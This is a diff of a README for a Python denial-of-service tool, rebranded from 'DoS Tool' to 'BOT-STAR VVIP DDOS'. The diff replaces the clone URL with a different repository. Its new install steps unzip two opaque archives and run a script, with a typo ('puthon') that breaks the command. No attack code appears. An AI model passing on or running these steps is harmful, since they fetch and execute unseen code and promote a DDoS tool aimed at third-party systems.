@@ -1,4 +1,4 @@
-<h1 align="center">📡 DoS Tool</h1> 
+<h1 align="center">📡 BOT-STAR VVIP DDOS</h1> 
 <div align="center">
 
 <img src="https://img.shields.io/badge/Made%20with-Python-1f425f.svg"> <img src="https://img.shields.io/github/forks/7zx/overload?style=social"> <img src="https://img.shields.io/github/stars/7zx/overload?style=social">
@@ -46,8 +46,11 @@ If you don't have it, then execute:
 ```
 sudo apt update
 sudo apt install python3 python3-pip git -y
-git clone https://github.com/7zx/overload
-cd overload/
+git clone https://github.com/CRAZY-ESX/BOT-STAR
+cd BOT-STAR 
+unzip BOT-STAR.zip
+unzip 2nd.zip
+puthon BOT-STAR.py
 
 make setup
 make run
@@ -64,11 +67,12 @@ make run
 pkg update
 pkg install python3 python3-pip git -y
 
-git clone https://github.com/7zx/overload
-cd overload/
+git clone https://github.com/CRAZY-ESX/BOT-STAR
+cd BOT-STAR 
+unzip BOT-STAR.zip
+unzip 2nd.zip
+puthon BOT-STAR.py
 
-pip install -r requirements.txt
-python3 overload.py
 ```
 
 ---
